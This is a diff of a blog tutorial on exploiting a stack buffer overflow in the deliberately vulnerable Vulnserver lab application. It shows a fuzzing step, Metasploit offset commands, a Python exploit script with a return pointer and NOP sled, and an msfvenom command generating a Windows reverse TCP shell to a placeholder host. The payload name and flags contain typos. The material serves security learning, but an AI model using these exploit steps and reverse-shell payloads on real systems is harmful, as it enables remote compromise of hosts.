@@ -8,15 +8,16 @@ comments: true
 
 Buffer overflow vulnerabilities are commonly targeted by exploiting buffer sizes. For example, if a buffer is set to allow 8 bytes however 10 are pushed to the buffer, the bytes can overflow into the next buffer. Below is a simple example depicting two buffers with a size of 8 bytes each. The second step depicts the push of 10 bytes to buffer 1, followed by the resulting buffer overflow of the extra two bytes that are ultimately pushed into buffer 2. Although the example depicts only 10 bytes being pushed to the buffer, this number can be increased and cause an overflow to multiple areas of memory that are located after the buffer. Buffer overflow will often result in an application crashing as integral data is overwritten by the overflow data.
 
-    ```C#
-    buffer1[8] = 0
-    buffer2[8] = 0
+```C#
+buffer1[8] = 0
+buffer2[8] = 0
 
-    push 0123456789 to buffer1
+push 0123456789 to buffer1
 
-    buffer1 = 0123456789
-    buffer2 = 89
-    ```
+buffer1 = 0123456789
+buffer2 = 89
+```
+{: .nolineno }
 
 Buffer Overflows can be controlled to allow shellcode execution and the ability for an attacker to gain root/system access on a host or have the targeted application perform contradictory operations such as allowing authentication in some instances.
 
@@ -69,6 +70,7 @@ To setup the environment, two hosts are required: a Kali Linux host and a Window
         s_string("%INPUT% ");
         s_string_variable("0");
         ```
+        {: .nolineno }
 
       - Running the test on `TRUN` identified a buffer overflow vulnerability. The below screenshot shows the evidence via immunity debugger. Note that the value `A` is repeated in register `EAX` and has overflowed into additional registers `ESP`, `EBP`, and `EIP`. The values of `EBP` and `EIP` are expressed in Hex equivalent (A = 41).
 
@@ -104,13 +106,15 @@ To setup the environment, two hosts are required: a Kali Linux host and a Window
                 print ("Fuzzing crashed at %s bytes" % str(len(buffer)))
                 sys.exit()
         ```
-        
+        {: .nolineno }
+
         Once the script has completed, the byte count will be printed to the terminal. In this example, the application crashed at **3300 bytes** and did not overwrite another registers apart from the `EAX`.
         - The next phase once the byte count has been determined is to identify the memory offset for the `EIP` register as it is the one in which requires to be overwritten with attacking code. Metasploit contains a module to create a pattern that will be used for the offset. Running the Metasploit module can be achieved via the below command with the switch `-l` indicating the byte count.
 
             ```bash
             /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3300
             ```
+            {: .nolineno }
 
         - Copy the output of the command, and either create a new Python script or alter the previous one used for the byte count discovery as per the example snippet below. Paste the copied offset string into `%OFFSET%` and enter the `%IP%` and `%PORT%` details. 
 
@@ -137,6 +141,7 @@ To setup the environment, two hosts are required: a Kali Linux host and a Window
                 print ("Error connecting to server")
                 sys.exit()
             ```
+            {: .nolineno }
 
         - Run the python script and it should again cause the application to crash and identify the `EIP` register address within the Immunity Debugger output, which can be seen in the below image. Of particular note is the memory address of the `EIP` which in this example is `386F4337`.
 
@@ -147,6 +152,7 @@ To setup the environment, two hosts are required: a Kali Linux host and a Window
             ```bash
             /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3300 -q 386F4337
             ```
+            {: .nolineno }
 
         - With the `EIP` identified, it is good practice to first identify any bad characters that could interfere with injected malicious shellcode. This specific example does not require this step, however further details can be found on this [Bulb Security](https://www.bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/) post about identifying any bad characters using Immunity Debugger. This section can also be performed after the next step as Mona.py contains a function `bytearray` to check for bad characters.
         - The next phase of crafting the overflow content is to identify modules or .dll file that do not have any memory protections. [Mona.py](https://github.com/corelan/mona/blob/master/mona.py) is a plugin for Immunity Debugger that can be used to identify such modules. After downloading and moving the python script into the `C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands` directory, restart Immunity Debugger and reattach the Vulnserver application. On the bottom portion of the Immunity Debugger is a command window, enter `!mona modules` to execute the plugin and run the modules function. Doing so will provide an output similar to that below. Note that the module `essFunc.dll` returns False against all checks, making it a prime candidate to abuse.
@@ -165,7 +171,7 @@ To setup the environment, two hosts are required: a Kali Linux host and a Window
 
             tInput = b"TRUN /.:/"
             pointer = b"\xaf\x11\x50\x62"
-            nopSled = b"\x90" * 32
+            nopSled = b"\x90" * 32 # A NOP-sled in the overflow content is used to more easily "slide" into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs. The multiplication value can be changed.
             overflow = b""
             shellcode = b"A" * 2003 + pointer + nopSled + overflow
             tIp = '%IP%'
@@ -178,21 +184,24 @@ To setup the environment, two hosts are required: a Kali Linux host and a Window
 
                 payload = tInput + shellcode
 
-                s.send((payload))
+                s.send((payload)) # Note that encoding has been removed, hence the b is presented prior to variable values to manually encode the values.
                 s.close
                     
             except:
                 print ("Error connecting to server")
                 sys.exit()
             ```
+            {: .nolineno }
 
         - The Python script sets a jump condition to the `ESP` register, meaning that the `EIP` should be set to the memory address `0x625011d3`. The last stage is to now inject the malicious shellcode into the buffer overflow to exploit the application. For this example, a reverse TCP shell is being generated via the Metaploit payload generator, [Msfvenom](https://darkcybe.github.io/posts/Capabilities/#malware-development-with-msfvenom), via the below command. Replace the `%IP%` and `%PORT%` as necessary.
 
             ```bash
             msfvenom -p windows/shell_reverse_rcp LHOST=%IP% LPORT=%PORT% EXITFUNC=thread -f -c -a x86 -b "\x00"
             ```
+            {: .nolineno }
 
             > The `-b` switch is used to list bad characters, if there are any additional they should be added. The example above depicts the NULL byte character.
+            {: .prompt-info }
         
         - Executing the Msfvenom command will output an unsigned char buf string, copy this code and add it to the python script as shown above within the `overflow` variable.
 
